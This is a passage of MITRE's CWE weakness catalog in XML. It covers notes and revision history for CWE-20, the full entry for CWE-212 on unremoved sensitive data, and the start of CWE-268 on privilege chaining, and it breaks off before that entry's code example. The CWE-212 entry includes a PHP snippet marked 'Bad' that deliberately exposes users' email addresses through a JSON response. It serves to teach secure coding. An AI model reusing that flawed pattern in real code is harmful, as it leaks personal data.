			  <Suggestion CWE_ID="1289" Comment="Unsafe Equivalence"/>
			  <Suggestion CWE_ID="116" Comment="Improper Encoding or Escaping of Output"/>
			</Suggestions>
         </Mapping_Notes>
         <Notes>
            <Note Type="Relationship">
               <xhtml:p>CWE-116 and CWE-20 have a close association because, depending on the nature of the structured message, proper input validation can indirectly prevent special characters from changing the meaning of a structured message. For example, by validating that a numeric ID field should only contain the 0-9 characters, the programmer effectively prevents injection attacks.</xhtml:p>
            </Note>
            <Note Type="Maintenance">As of 2020, this entry is used more often than preferred, and it is a source of frequent confusion. It is being actively modified for CWE 4.1 and subsequent versions.</Note>
            <Note Type="Maintenance">Concepts such as validation, data transformation, and neutralization are being refined, so relationships between CWE-20 and other entries such as CWE-707 may change in future versions, along with an update to the Vulnerability Theory document.</Note>
            <Note Type="Maintenance">Input validation - whether missing or incorrect - is such an essential and widespread part of secure development that it is implicit in many different weaknesses. Traditionally, problems such as buffer overflows and XSS have been classified as input validation problems by many security professionals. However, input validation is not necessarily the only protection mechanism available for avoiding such problems, and in some cases it is not even sufficient. The CWE team has begun capturing these subtleties in chains within the Research Concepts view (CWE-1000), but more work is needed.</Note>
            <Note Type="Terminology">
               <xhtml:p>The "input validation" term is extremely common, but it is used in many different ways. In some cases its usage can obscure the real underlying weakness or otherwise hide chaining and composite relationships.</xhtml:p>
               <xhtml:p>Some people use "input validation" as a general term that covers many different neutralization techniques for ensuring that input is appropriate, such as filtering, canonicalization, and escaping. Others use the term in a more narrow context to simply mean "checking if an input conforms to expectations without changing it."  CWE uses this more narrow interpretation.</xhtml:p>
            </Note>
         </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>7 Pernicious Kingdoms</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
               <Submission_Version>Draft 3</Submission_Version>
               <Submission_ReleaseDate>2006-07-19</Submission_ReleaseDate>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations, Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Organization>Veracode</Modification_Organization>
               <Modification_Date>2008-08-15</Modification_Date>
               <Modification_Comment>Suggested OWASP Top Ten 2004 mapping</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Relationships, Other_Notes, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-11-24</Modification_Date>
               <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-01-12</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Common_Consequences, Demonstrative_Examples, Description, Likelihood_of_Exploit, Name, Observed_Examples, Other_Notes, Potential_Mitigations, References, Relationship_Notes, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-03-10</Modification_Date>
               <Modification_Comment>updated Description, Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-05-27</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-07-27</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-10-29</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Demonstrative_Examples, Maintenance_Notes, Modes_of_Introduction, Observed_Examples, Relationships, Research_Gaps, Terminology_Notes</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-12-28</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Demonstrative_Examples, Detection_Factors</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-02-16</Modification_Date>
               <Modification_Comment>updated Detection_Factors, Potential_Mitigations, References, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-04-05</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-06-21</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations, Research_Gaps, Terminology_Notes</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-09-27</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-12-13</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Description</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-03-29</Modification_Date>
               <Modification_Comment>updated Observed_Examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Common_Consequences, Relationship_Notes</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-09-13</Modification_Date>
               <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, References, Related_Attack_Patterns, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2013-02-21</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2013-07-17</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-02-18</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Detection_Factors, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-01-19</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-05-03</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Modes_of_Introduction, References, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2018-03-27</Modification_Date>
               <Modification_Comment>updated References</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-01-03</Modification_Date>
					<Modification_Comment>updated Related_Attack_Patterns, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-06-20</Modification_Date>
					<Modification_Comment>updated Related_Attack_Patterns, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-09-19</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Potential_Mitigations, References, Related_Attack_Patterns, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-06-25</Modification_Date>
					<Modification_Comment>updated Applicable_Platforms, Demonstrative_Examples, Description, Maintenance_Notes, Observed_Examples, Potential_Mitigations, References, Relationship_Notes, Relationships, Research_Gaps, Terminology_Notes</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-08-20</Modification_Date>
					<Modification_Comment>updated Potential_Mitigations, Related_Attack_Patterns, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-03-15</Modification_Date>
					<Modification_Comment>updated Description, Potential_Mitigations</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-07-20</Modification_Date>
					<Modification_Comment>updated Related_Attack_Patterns, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-04-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-06-28</Modification_Date>
					<Modification_Comment>updated Observed_Examples, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-10-13</Modification_Date>
					<Modification_Comment>updated References, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-04-27</Modification_Date>
					<Modification_Comment>updated References, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-06-29</Modification_Date>
					<Modification_Comment>updated Mapping_Notes, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-10-26</Modification_Date>
					<Modification_Comment>updated Observed_Examples</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2024-07-16</Modification_Date>
					<Modification_Version>4.15</Modification_Version>
					<Modification_ReleaseDate>2024-07-16</Modification_ReleaseDate>
					<Modification_Comment>updated Observed_Examples</Modification_Comment>
				</Modification>
            <Previous_Entry_Name Date="2009-01-12">Insufficient Input Validation</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="212" Name="Improper Removal of Sensitive Information Before Storage or Transfer" Abstraction="Base" Structure="Simple" Status="Incomplete">
         <Description>The product stores, transfers, or shares a resource that contains sensitive information, but it does not properly remove that information before the product makes the resource available to unauthorized actors.</Description>
         <Extended_Description>
            <xhtml:p>Resources that may contain sensitive data include documents, packets, messages, databases, etc. While this data may be useful to an individual user or small set of users who share the resource, it may need to be removed before the resource can be shared outside of the trusted group. The process of removal is sometimes called cleansing or scrubbing.</xhtml:p>
            <xhtml:p>For example, a product for editing documents might not remove sensitive data such as reviewer comments or the local pathname where the document is stored. Or, a proxy might not remove an internal IP address from headers before making an outgoing request to an Internet site.</xhtml:p>
         </Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="669" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="669" View_ID="1003" Ordinal="Primary"/>
            <Related_Weakness Nature="CanPrecede" CWE_ID="201" View_ID="1000" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Weakness_Ordinalities>
            <Weakness_Ordinality>
               <Ordinality>Primary</Ordinality>
            </Weakness_Ordinality>
            <Weakness_Ordinality>
               <Ordinality>Resultant</Ordinality>
            </Weakness_Ordinality>
         </Weakness_Ordinalities>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</Note>
            </Introduction>
            <Introduction>
               <Phase>Operation</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Files or Directories</Impact>
               <Impact>Read Application Data</Impact>
               <Note>Sensitive data may be exposed to an unauthorized actor in another control sphere. This may have a wide range of secondary consequences which will depend on what data is exposed. One possibility is the exposure of system data allowing an attacker to craft a specific, more effective attack.</Note>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Requirements</Phase>
               <Description>Clearly specify which information should be regarded as private or sensitive, and require that the product offers functionality that allows the user to cleanse the sensitive information from the resource before it is published or exported to other parties.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-46">
               <Phase>Architecture and Design</Phase>
               <Strategy>Separation of Privilege</Strategy>
               <Description>
                  <xhtml:p>Compartmentalize the system to have "safe" areas where trust boundaries can be unambiguously drawn. Do not allow sensitive data to go outside of the trust boundary and always be careful when interfacing with a compartment outside of the safe area.</xhtml:p>
                  <xhtml:p>Ensure that appropriate compartmentalization is built into the system design, and the compartmentalization allows for and reinforces privilege separation functionality. Architects and designers should rely on the principle of least privilege to decide the appropriate time to use privileges and the time to drop privileges.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-33">
               <Phase>Implementation</Phase>
               <Strategy>Attack Surface Reduction</Strategy>
               <Description>Use naming conventions and strong types to make it easier to spot when sensitive data is being used. When creating structures, objects, or other complex entities, separate the sensitive and non-sensitive data as much as possible.</Description>
               <Effectiveness>Defense in Depth</Effectiveness>
               <Effectiveness_Notes>This makes it easier to spot places in the code where data is being used that is unencrypted.</Effectiveness_Notes>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>Avoid errors related to improper resource shutdown or release (CWE-404), which may leave the sensitive data within the resource if it is in an incomplete state.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example Demonstrative_Example_ID="DX-220">
               <Intro_Text>This code either generates a public HTML user information page or a JSON response containing the same user information.</Intro_Text>
               <Example_Code Nature="Bad" Language="PHP">
                  <xhtml:div>
                     <xhtml:br/>
                     <xhtml:i>// API flag, output JSON if set</xhtml:i>
                     <xhtml:br/>$json = $_GET['json']<xhtml:br/>$username = $_GET['user']<xhtml:br/>if(!$json)<xhtml:br/>{<xhtml:div style="margin-left:1em;">
                        <xhtml:div>$record = getUserRecord($username);<xhtml:br/>foreach($record as $fieldName =&gt; $fieldValue)<xhtml:br/>{<xhtml:div style="margin-left:1em;">
                              <xhtml:div>if($fieldName == "email_address") {<xhtml:div style="margin-left:1em;">
                                    <xhtml:div>
                                       <xhtml:br/>
                                       <xhtml:i>// skip displaying user emails</xhtml:i>
                                       <xhtml:br/>continue;</xhtml:div>
                                 </xhtml:div>}<xhtml:br/>else{<xhtml:div style="margin-left:1em;">writeToHtmlPage($fieldName,$fieldValue);</xhtml:div>}</xhtml:div>
                           </xhtml:div>}</xhtml:div>
                     </xhtml:div>}<xhtml:br/>else<xhtml:br/>{<xhtml:div style="margin-left:1em;">$record = getUserRecord($username);<xhtml:br/>echo json_encode($record);</xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>The programmer is careful to not display the user's e-mail address when displaying the public HTML page. However, the e-mail address is not removed from the JSON response, exposing the user's e-mail address.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2019-3733</Reference>
               <Description>Cryptography library does not clear heap memory before release</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2019-3733</Link>
            </Observed_Example>
			<Observed_Example>
               <Reference>CVE-2005-0406</Reference>
               <Description>Some image editors modify a JPEG image, but the original EXIF thumbnail image is left intact within the JPEG. (Also an interaction error).</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-0406</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2002-0704</Reference>
               <Description>NAT feature in firewall leaks internal IP addresses in ICMP error messages.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2002-0704</Link>
            </Observed_Example>
         </Observed_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="PLOVER">
               <Entry_Name>Cross-Boundary Cleansing Infoleak</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="168"/>
         </Related_Attack_Patterns>
         <Mapping_Notes>
            <Usage>Allowed</Usage>
            <Rationale>This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.</Rationale>
            <Comments>Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.</Comments>
            <Reasons>
               <Reason Type="Acceptable-Use"/>
            </Reasons>
         </Mapping_Notes>
         <Notes>
            <Note Type="Relationship">This entry is intended to be different from resultant information leaks, including those that occur from improper buffer initialization and reuse, improper encryption, interaction errors, and multiple interpretation errors. This entry could be regarded as a privacy leak, depending on the type of information that is leaked.</Note>
            <Note Type="Relationship">There is a close association between CWE-226 and CWE-212. The difference is partially that of perspective. CWE-226 is geared towards the final stage of the resource lifecycle, in which the resource is deleted, eliminated, expired, or otherwise released for reuse. Technically, this involves a transfer to a different control sphere, in which the original contents of the resource are no longer relevant. CWE-212, however, is intended for sensitive data in resources that are intentionally shared with others, so they are still active. This distinction is useful from the perspective of the CWE research view (CWE-1000).</Note>
            <Note Type="Terminology">The terms "cleansing" and "scrubbing" have multiple uses within computing. In information security, these are used for the removal of sensitive data, but they are also used for the modification of incoming/outgoing data so that it conforms to specifications.</Note>
         </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>PLOVER</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
               <Submission_Version>Draft 3</Submission_Version>
               <Submission_ReleaseDate>2006-07-19</Submission_ReleaseDate>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Relationships, Other_Notes, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-10-14</Modification_Date>
               <Modification_Comment>updated Description</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-10-29</Modification_Date>
               <Modification_Comment>updated Description, Other_Notes, Relationship_Notes</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-12-28</Modification_Date>
               <Modification_Comment>updated Name</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-02-16</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Common_Consequences, Description, Name, Observed_Examples, Potential_Mitigations, Relationship_Notes, Relationships, Terminology_Notes</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-04-05</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-06-21</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-09-27</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-27</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Modes_of_Introduction, Relationships</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-06-20</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Description, Name, Relationships, Weakness_Ordinalities</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-06-25</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-12-10</Modification_Date>
					<Modification_Comment>updated Potential_Mitigations</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Description</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-04-27</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-06-29</Modification_Date>
					<Modification_Comment>updated Mapping_Notes</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2024-02-29</Modification_Date>
					<Modification_Version>4.14</Modification_Version>
					<Modification_ReleaseDate>2024-02-29</Modification_ReleaseDate>
					<Modification_Comment>updated Demonstrative_Examples, Observed_Examples</Modification_Comment>
				</Modification>
            <Previous_Entry_Name Date="2009-12-28">Cross-boundary Cleansing Information Leak</Previous_Entry_Name>
            <Previous_Entry_Name Date="2010-02-16">Improper Cross-boundary Cleansing</Previous_Entry_Name>
			<Previous_Entry_Name Date="2020-02-24">Improper Cross-boundary Removal of Sensitive Data</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="268" Name="Privilege Chaining" Abstraction="Base" Structure="Simple" Status="Draft">
         <Description>Two distinct privileges, roles, capabilities, or rights can be combined in a way that allows an entity to perform unsafe actions that would not be allowed without that combination.</Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="269" View_ID="1000" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Weakness_Ordinalities>
            <Weakness_Ordinality>
               <Ordinality>Primary</Ordinality>
            </Weakness_Ordinality>
         </Weakness_Ordinalities>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</Note>
            </Introduction>
            <Introduction>
               <Phase>Operation</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Likelihood_Of_Exploit>High</Likelihood_Of_Exploit>
         <Common_Consequences>
            <Consequence>
               <Scope>Access Control</Scope>
               <Impact>Gain Privileges or Assume Identity</Impact>
               <Note>A user can be given or gain access rights of another user. This can give the user unauthorized access to sensitive information including the access information of another user.</Note>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation Mitigation_ID="MIT-49">
               <Phase>Architecture and Design</Phase>
               <Strategy>Separation of Privilege</Strategy>
               <Description>Consider following the principle of separation of privilege. Require multiple conditions to be met before permitting access to a system resource.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-1">
               <Phase>Architecture and Design</Phase>
               <Phase>Operation</Phase>
               <Description>Very carefully manage the setting, management, and handling of privileges. Explicitly manage trust zones in the software.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-17">
               <Phase>Architecture and Design</Phase>
               <Phase>Operation</Phase>
               <Strategy>Environment Hardening</Strategy>
               <Description>Run your code using the lowest privileges that are required to accomplish the necessary tasks [REF-76]. If possible, create isolated accounts with limited privileges that are only used for a single task. That way, a successful attack will not immediately give the attacker access to the rest of the software or its environment. For example, database applications rarely need to run as the database administrator, especially in day-to-day operations.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example Demonstrative_Example_ID="DX-128">
               <Intro_Text>This code allows someone with the role of "ADMIN" or "OPERATOR" to reset a user's password. The role of "OPERATOR" is intended to have less privileges than an "ADMIN", but still be able to help users with small issues such as forgotten passwords.</Intro_Text>
               <Example_Code Nature="Bad" Language="Java">
